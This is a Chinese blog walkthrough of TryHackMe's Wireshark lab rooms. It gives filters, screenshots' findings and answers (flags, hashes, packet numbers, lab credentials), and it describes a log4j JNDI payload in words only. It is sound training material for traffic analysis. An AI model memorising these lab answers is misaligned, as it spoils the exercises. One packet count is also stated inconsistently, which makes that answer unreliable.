alt=\"ask1\"></p>\n<p>由图就能看出总数为1000个</p>\n<h3 id=\"第二问\"><a href=\"#第二问\" class=\"headerlink\" title=\"第二问\"></a>第二问</h3><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/tcpconnect.png\" alt=\"ask2\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcp.port == 80</span><br></pre></td></tr></table></figure>\n\n<p>第一个包会发现是tcp connect的数据包</p>\n<h3 id=\"第三问\"><a href=\"#第三问\" class=\"headerlink\" title=\"第三问\"></a>第三问</h3><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/udpguabi.png\" alt=\"ask3\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">icmp.type == 3 &amp;&amp; icmp.code == 3</span><br></pre></td></tr></table></figure>\n\n<p>icmp.type &#x3D;&#x3D; 3意思就是目的地不可达</p>\n<p>icmp.code &#x3D;&#x3D; 3意思就是端口不可达</p>\n<p>这样就能查出有1083个关闭的端口</p>\n<h2 id=\"第四问\"><a href=\"#第四问\" class=\"headerlink\" title=\"第四问\"></a>第四问</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/udp1.png\" alt=\"ask4\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">udp.port in &#123;55..70&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们过滤出来之后分析一下这个数据包走向 前面67和69端口的数据包后面都显示没到达目的地 而68端口则显示成功 数据包一直在传输。说明68端口开放</p>\n<h2 id=\"task3-2\"><a href=\"#task3-2\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/task3.png\" alt=\"task3\"></p>\n<h3 id=\"第一问-1\"><a href=\"#第一问-1\" class=\"headerlink\" title=\"第一问\"></a>第一问</h3><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/284.png\" alt=\"ask1\"></p>\n<p>我们仔细观察就能发现攻击者的物理地址 就图片蓝色标的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(arp.opcode== 1) &amp;&amp; (eth.src == 00:0c:29:e2:18:b4)</span><br></pre></td></tr></table></figure>\n\n<p>arp.opcode &#x3D;&#x3D; 1 就是过滤arp请求包</p>\n<p>其实单点一下你要的选项 把他拖到搜索栏那里就能自动输入 没有这么麻烦 就这个问题举例子 点到源地址这个选项 单击拖到搜索栏 选择and selected 就能自动输入</p>\n<h3 id=\"第二问-1\"><a href=\"#第二问-1\" class=\"headerlink\" title=\"第二问\"></a>第二问</h3><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/httppacket.png\" alt=\"ask2\"></p>\n<p>这题是说攻击者收到的http包的数目 意思就是目的地应该是攻击者的地址才对 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(http) &amp;&amp; (eth.dst == 00:0c:29:e2:18:b4)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"第三问-1\"><a href=\"#第三问-1\" class=\"headerlink\" title=\"第三问\"></a>第三问</h3><p>问用户名和密码的话 八层应该是与登录有关 我们搜一下关键词login 随便点进去看到有个可疑的值 uname和pass</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/number6.png\" alt=\"ask3\"></p>\n<p>把uname值拖到搜索栏搜一下 就能找到六个账户密码的条数</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/6.png\" alt=\"ask3\"></p>\n<h3 id=\"第四问-1\"><a href=\"#第四问-1\" class=\"headerlink\" title=\"第四问\"></a>第四问</h3><p>问一个账户的密码 我们就在上一题的地方找到Client986这个账户 在里面就能翻到密码clientnothere!</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/client986.png\" alt=\"ask4\"></p>\n<h3 id=\"第五问\"><a href=\"#第五问\" class=\"headerlink\" title=\"第五问\"></a>第五问</h3><p>我们在上一题找到Client986 我们把这个值拖到搜索栏 把Client986改成Client354 就能搜到与Client354有关的数据包 进去后在周围翻翻就能找到密码</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/nice354.png\" alt=\"ask5\"></p>\n<p>在周围翻翻就能找到密码</p>\n<h2 id=\"task4-2\"><a href=\"#task4-2\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/task4.png\" alt=\"task4\"></p>\n<h3 id=\"第一问-2\"><a href=\"#第一问-2\" class=\"headerlink\" title=\"第一问\"></a>第一问</h3><p>问主机盖乐世a30的mac地址 那我们搜搜看有没有数据包有a30这个字段的</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/a30.png\" alt=\"ask1\"></p>\n<p>找到之后往上面找找地址 destination地址是cisco思科的企业协议 源地址估计就是我们想要的</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/a301.png\" alt=\"ask1\"></p>\n<h3 id=\"第二问-2\"><a href=\"#第二问-2\" class=\"headerlink\" title=\"第二问\"></a>第二问</h3><p>问工作站的netbios注册请求</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/lival.png\" alt=\"ask2\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nbns.name contains &quot;LIVALJM&quot; &amp;&amp; nbns.flags opcode == 5 </span><br></pre></td></tr></table></figure>\n\n<p>nbns.flags opcode &#x3D;&#x3D; 5 表示nbns的注册请求</p>\n<h3 id=\"第三问-2\"><a href=\"#第三问-2\" class=\"headerlink\" title=\"第三问\"></a>第三问</h3><p>问哪个主机请求的ip是172.16.13.85</p>\n<p>我们先搜一下dhcp 看一下数据包先 在最底下发现一行requested ip address 把这个值拖到搜索栏和dhcp一起搜索<br>记得加上我们题目说的ip</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/a12.png\" alt=\"ask3\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(dhcp) &amp;&amp; (dhcp.option.requested_ip_address == 172.16.13.85)</span><br></pre></td></tr></table></figure>\n\n<p>一搜一个准 找到主机名 盖乐世的a12</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/a121.png\" alt=\"ask3\"></p>\n<h3 id=\"第四问-2\"><a href=\"#第四问-2\" class=\"headerlink\" title=\"第四问\"></a>第四问</h3><p>找u5这个用户的ip </p>\n<p>CNameString在kerberos中就算是用户名 把这个参数拉到搜索栏 搜u5就行了</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/u5.png\" alt=\"ask4\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/u51.png\" alt=\"ask4\"></p>\n<p>我这算很繁琐的步骤 用下面这个命令就一步到位了 知道ip是10.1.12.2 诶 要记住不能只填ip 他说是defanged ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kerberos.CNameString contains &quot;u5&quot;</span><br></pre></td></tr></table></figure>\n\n<p>科普一下<br>Defanged IP address”（去毒化的 IP 地址）是一种安全处理技术，于修改 IP 地址的显示格式，使其在文档、日志或安全报告中不被自动识别为可点击的链接，从而防止意外访问或自动化攻击。</p>\n<p>把.换成[.]就行了</p>\n<h3 id=\"第五问-1\"><a href=\"#第五问-1\" class=\"headerlink\" title=\"第五问\"></a>第五问</h3><p>要查主机名 在kerberos中主机名和用户名有点小区别</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/user.png\" alt=\"ask5\"></p>\n<p>就得在后面加个$ 所以我们就查CNameString带$的就行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kerberos.CNameString contains &quot;$&quot; </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/xp1.png\" alt=\"ask5\"></p>\n<p>查到了一个叫xp1$的用户名</p>\n<h2 id=\"task5-2\"><a href=\"#task5-2\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/task5.png\" alt=\"task5\"></p>\n<h3 id=\"第一问-3\"><a href=\"#第一问-3\" class=\"headerlink\" title=\"第一问\"></a>第一问</h3><p>问什么协议<br>这题其实我来说没多大灵感 就搜icmp然后往下翻翻 看看有哪个包的大小异常吗 结果发现还真有 点开看看 发现开头就发现了dh协议 ssh敲定了<br><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/ssh.png\" alt=\"ask1\"></p>\n<h3 id=\"第二问-3\"><a href=\"#第二问-3\" class=\"headerlink\" title=\"第二问\"></a>第二问</h3><p>开始就是搜索dns看看有什么大小异常的包吗 还是出乎意料 真有一个</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/data.png\" alt=\"ask2\"></p>\n<p>底下发下一个网站 把网址中的.转化成[.] 输进去发现成了</p>\n<p>这两个纯纯狗屎运</p>\n<h2 id=\"task6-1\"><a href=\"#task6-1\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/task6.png\" alt=\"task2\"></p>\n<h3 id=\"第一问-4\"><a href=\"#第一问-4\" class=\"headerlink\" title=\"第一问\"></a>第一问</h3><p>问有几次登录失败</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ftp.response.code == 530</span><br></pre></td></tr></table></figure>\n\n<p>530：未登录，密码无效 刚好适合错误的登录尝试</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/error737.png\" alt=\"ask1\"></p>\n<h3 id=\"第二问-4\"><a href=\"#第二问-4\" class=\"headerlink\" title=\"第二问\"></a>第二问</h3><p>问的是文件大小 应该是和文件状态有关</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ftp.response.code == 213</span><br></pre></td></tr></table></figure>\n<p>213：文件状态</p>\n<p>输完命令之后我们点开追踪流检查一下</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/213.png\" alt=\"ask2\"></p>\n<p>发现有个39424大小的文件</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/2131.png\" alt=\"ask2\"></p>\n<h3 id=\"第三问-第四问\"><a href=\"#第三问-第四问\" class=\"headerlink\" title=\"第三问 &amp; 第四问\"></a>第三问 &amp; 第四问</h3><p>问文件名和升级文件权限的命令。<br>同样在这个追踪流里面可以看到。<br><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/chmod.png\" alt=\"ask2\"></p>\n<p>文件和命令都看见了。</p>\n<h2 id=\"task7\"><a href=\"#task7\" class=\"headerlink\" title=\"task7\"></a>task7</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/task7.png\" alt=\"task2\"></p>\n<h3 id=\"第一问-第二问\"><a href=\"#第一问-第二问\" class=\"headerlink\" title=\"第一问&amp;第二问\"></a>第一问&amp;第二问</h3><p>这一问纯玄学 问异常的类型<br><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/jizhong.png\" alt=\"ask1\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/jizhong2.png\" alt=\"ask1\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/jizhong4.png\" alt=\"ask1\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/jizhong5.png\" alt=\"ask1\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/jizhong6.png\" alt=\"ask1\"></p>\n<p>最后一个是mozilla和mozllla差了个字</p>\n<p>第二题刚好问了这个有差别的包的编号是什么 第52个</p>\n<h3 id=\"第三问-第四问-1\"><a href=\"#第三问-第四问-1\" class=\"headerlink\" title=\"第三问&amp;第四问\"></a>第三问&amp;第四问</h3><p>第几个包发动log4j攻击的</p>\n<p>问了问度娘<br>Log4j 是一个广泛使用的 Java 日志记录库，jndi（Java 命名和目录接口）是 Java 的一部分，允许 Java 应用程序查找和访问命名服务。</p>\n<p>输入命令搜一下 出现的第一个是编号444的包 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip contains &quot;jndi&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/jndi.png\" alt=\"aks3\"></p>\n<p>点进去发现一个惊喜 应该是base64编码 拉到cyberchief里面解码<br><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/jndi1.png\" alt=\"aks3\"></p>\n<p>会发现在用wegt下载 设置权限 运行脚本 把ip转成defang的ip 就是第四题的答案<br><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/jizhong3.png\" alt=\"ask1\"></p>\n<h2 id=\"task8\"><a href=\"#task8\" class=\"headerlink\" title=\"task8\"></a>task8</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/task8.png\" alt=\"task2\"></p>\n<h3 id=\"第一问-5\"><a href=\"#第一问-5\" class=\"headerlink\" title=\"第一问\"></a>第一问</h3><p>问发送到“accounts.google.com”的“Client Hello”消息的框架编号是多少？</p>\n<p>Client Hello：tls.handshake.type &#x3D;&#x3D; 1<br>server Hello： tls.handshake.type &#x3D;&#x3D; 2  </p>\n<p>我们先收集一下所有的Client Hello 随便点一个点开他的server name 拉到搜索栏 server name改成‘accounts.google.com’<br><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/client.png\" alt=\"ask1\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(tls.handshake.type == 1)  &amp;&amp; (tls.handshake.extensions_server_name == &quot;accounts.google.com&quot;)</span><br></pre></td></tr></table></figure>\n\n<p>一下就搜出来了</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/16.png\" alt=\"ask1\"></p>\n<h3 id=\"第二问-5\"><a href=\"#第二问-5\" class=\"headerlink\" title=\"第二问\"></a>第二问</h3><p>导入秘钥 直接搜http2就出来了 共115个</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/http2.png\" alt=\"ask2\"></p>\n<h3 id=\"第三问-3\"><a href=\"#第三问-3\" class=\"headerlink\" title=\"第三问\"></a>第三问</h3><p>去322编号的数据包</p>\n<p>直接点开跟踪流 把网站的.弄成[.]</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/322.png\" alt=\"ask3\"></p>\n<h3 id=\"第四问-3\"><a href=\"#第四问-3\" class=\"headerlink\" title=\"第四问\"></a>第四问</h3><p>找这种数据包里的文件有个很diao的方法 我们导出文件</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/flag0.png\" alt=\"ask4\"></p>\n<p>点进去就能找到疑似flag的包</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/flag.png\" alt=\"ask4\"></p>\n<p>保存到桌面 查看一下就行了</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/flag1.png\" alt=\"ask4\"></p>\n<h2 id=\"task9\"><a href=\"#task9\" class=\"headerlink\" title=\"task9\"></a>task9</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/task9.png\" alt=\"task2\"></p>\n<h3 id=\"第一问-第二问-1\"><a href=\"#第一问-第二问-1\" class=\"headerlink\" title=\"第一问&amp;第二问\"></a>第一问&amp;第二问</h3><p>明文凭证 这一问都是在这里面完成</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/cred.png\" alt=\"ask\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/cred1.png\" alt=\"ask\"><br>第一问的数据包编号就是237</p>\n<p>第二个就得看看数据包先 </p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/ftp1.png\" alt=\"ask\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/ftp2.png\" alt=\"ask\"></p>\n<p>数据包基本就分这两类 user和pass 还有别的无关紧要的 要求是说空密码 就把 request command：pass那行拉去搜索</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/ftp.png\" alt=\"ask\"></p>\n<p>发现第170个包的pass空空的 没错了</p>\n<h2 id=\"task10\"><a href=\"#task10\" class=\"headerlink\" title=\"task10\"></a>task10</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/task10.png\" alt=\"task2\"></p>\n<p>照着题目点击对应的数据包 点开防火墙规则设置</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/fire0.png\" alt=\"ask\"></p>\n<p>把这两个规则复制粘贴就行 第二问要把deny改成allow 因为题目问的是允许</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/fire.png\" alt=\"ask\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/fire2.png\" alt=\"ask\"></p>\n<p>wireshark三个部分总算肝完 其实也不算肝 就是内容小多 内容也干得要死 全是干货 过段时间更一下wireshark的实战 试试水</p>\n","excerpt":"","more":"<p>wireshark 一个流量分析的工具 一个抓取流量包的工具<br>一个暗藏<del>只因</del>(玄机)的工具 只要擅长使用这个工具能带来很大的帮助 </p>\n<p>简单看看tryhackme的wireshark教程 总共是分为三个部分</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/title.png\" alt=\"title\"></p>\n<h1 id=\"the-basic\"><a href=\"#the-basic\" class=\"headerlink\" title=\"the basic\"></a>the basic</h1><p>基础部分当然是介绍解释wireshark的操作界面和基础功能</p>\n<p>先来看看初始界面</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/zhuomian.png\" alt=\"chushi\"></p>\n<p>从上往下分别是工具栏，显示过滤栏(用来过滤我们需要的东西)，最近文件，捕获过滤器和接口，状态栏</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/inzhuo.png\" alt=\"in\"></p>\n<p>这个界面就是一般我们平时使用的上面红色的部分就是数据包列表，中间的分别是数据包细节和数据包的字节，最下面是告诉我们有几个数据包 以及展示的数据包数目。</p>\n<p>我们来看一下task2 讲了啥东西</p>\n<h2 id=\"task-2\"><a href=\"#task-2\" class=\"headerlink\" title=\"task 2\"></a>task 2</h2><p>Wireshark 是目前最强大的流量分析工具之一。它有多种用途：</p>\n<ul>\n<li>检测并排除网络问题，例如网络负载故障点和拥塞。</li>\n<li>检测安全异常，例如恶意主机、异常端口使用和可疑流量。</li>\n<li>调查和了解协议细节，例如响应代码和有效负载数据。</li>\n</ul>\n<p>科普完毕 来看一下他要求</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/task2.png\" alt=\"task\"></p>\n<p>需要我们去查看文件信息 点击这个就可以查看文件信息 我们往下滑就能看到 全部题目的答案</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/st.png\" alt=\"st\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/hash.png\" alt=\"st\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/flag.png\" alt=\"st\"></p>\n<p>第一题的flag就在底下 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:TryHackMe_Wireshark_Demo</span><br></pre></td></tr></table></figure>\n\n<p>数据包的总数为58620个 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:57620</span><br></pre></td></tr></table></figure>\n\n<p>hash值也显而易见</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f446de335565fb0b0ee5e5a3266703c778b2f3dfad7efeaeccb2da5641a6d6eb</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"task3\"><a href=\"#task3\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/task3.png\" alt=\"task\"></p>\n<p>查找数据包的编号先</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/finds.png\" alt=\"task\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/38.png\" alt=\"task\"></p>\n<p>可以发现使用了xml语言</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:eXtensible Markup Language</span><br></pre></td></tr></table></figure>\n\n<p>看时间的话 就得点进去慢慢找了 其实点进去就能发现到达时间</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/time.png\" alt=\"time\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:13/05/2004</span><br></pre></td></tr></table></figure>\n\n<p>ttl就是time to live 存活周期 是在osi的第三层 网络层那里 我们就到ip的那个部分找找</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/ttl.png\" alt=\"time\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:47</span><br></pre></td></tr></table></figure>\n\n<p>tcp的有效负载大小 就得在数据包细节找到tcp的部分 负载应该能理解成一端的大小</p>\n<p>tcp是在第四层 传输层</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/tcp.png\" alt=\"tcp\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:424</span><br></pre></td></tr></table></figure>\n\n<p>etag也在这附近 在底下找找就有了</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/etag.png\" alt=\"tcp\"></p>\n<h2 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/task4.png\" alt=\"task4\"></p>\n<p>查r4w这个字串 的第一个艺术家叫啥名字</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/r4w.png\" alt=\"task4\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/r4w1.png\" alt=\"task4\"></p>\n<p>能看到第一个艺术家的名字 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:r4w8173</span><br></pre></td></tr></table></figure>\n\n<p>去编号是12的数据包那看评论是啥 这个就有意思了 </p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet1.png\" alt=\"task4\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet2.png\" alt=\"task4\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/12.png\" alt=\"task4\"></p>\n<p>又让我去39765这个包里面找照片 一开始我是没想到这东西还能直接导出来 后面有一个note.txt也是一样 要我们导出来 cat一下就行 照片就不太一样 他说了要md5 我们用md5sum来把他提取出来</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/img.png\" alt=\"task4\"></p>\n<p>导出之后直接md5sum 加你保存的文件名</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/md5.png\" alt=\"task4\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:911cd574a42865a956ccde2d04495ebf</span><br></pre></td></tr></table></figure>\n\n<p>需要找一个txt文件 先用过滤器去过滤一下 找到txt文件在哪</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/note0.png\" alt=\"task4\"></p>\n<p>然后我们导出http 把note.txt导出来</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/note.png\" alt=\"task4\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/note2.png\" alt=\"task4\"></p>\n<p>保存之后 我们直接查看就能看到外星人名字</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/name.png\" alt=\"task4\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:packermaster</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/task5.png\" alt=\"task5\"></p>\n<p>第一题就是http</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans：http</span><br></pre></td></tr></table></figure>\n\n<p>第二题我们过滤了http之后 在底下会有显示展示了多少个数据包</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/http.png\" alt=\"shujubao\"></p>\n<p>下面显示1089个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:1089</span><br></pre></td></tr></table></figure>\n\n<p>第三题 去到33790的包中查看一下细节</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/secend.png\" alt=\"shujubao\"></p>\n<p>进http流里面搜索artists 就能看到艺术家名字 会发现艺术家共有三个 第二个叫做Blad3</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/band.png\" alt=\"shujubao\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:3</span><br><span class=\"line\"></span><br><span class=\"line\">ans:Blad3</span><br></pre></td></tr></table></figure>\n\n<p>第一个部分 基础部分结束了 我们来看下一个部分</p>\n<h1 id=\"Packet-Operations\"><a href=\"#Packet-Operations\" class=\"headerlink\" title=\"Packet Operations\"></a>Packet Operations</h1><p>数据包操作 我们来看点小难的来练练 主要也是深入了解一点wireshark</p>\n<p>这个地方是统计 可以看协议的数据包 主要是对数据包进行统计 可以在里面找到你想要的数据包</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/ipvx.png\" alt=\"qwe\"></p>\n<h2 id=\"task2\"><a href=\"#task2\" class=\"headerlink\" title=\"task2\"></a>task2</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/task2.png\" alt=\"task2\"></p>\n<p>第一题我们得在resolved addresses里面去找 因为是在找hostname是bbc的ip</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/bbc.png\" alt=\"task2\"></p>\n<p>ip为199.232.24.81</p>\n<p>第二题是在找ipv4的对话 那我们要在对话里面去找ipv4</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/ipv4.png\" alt=\"task2\"></p>\n<p>共有435个对话</p>\n<p>第三题 这次我们现在resolved addresses找一下micro-st的地址 然后去endpoint查询这个地址的字节</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/micro.png\" alt=\"task2\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/mac.png\" alt=\"task2\"></p>\n<p>这两招下来就能找到字节大小 7474bytes</p>\n<p>第三题依然是在endpoints里面找 找到city 筛选一下。能找到四个Kansas City有关的地址</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/city.png\" alt=\"city\"></p>\n<p>第四题在endpoints 里面找组织 也是筛选一下 就能知道ip是188.246.82.7</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/blicnet.png\" alt=\"city\"></p>\n<h2 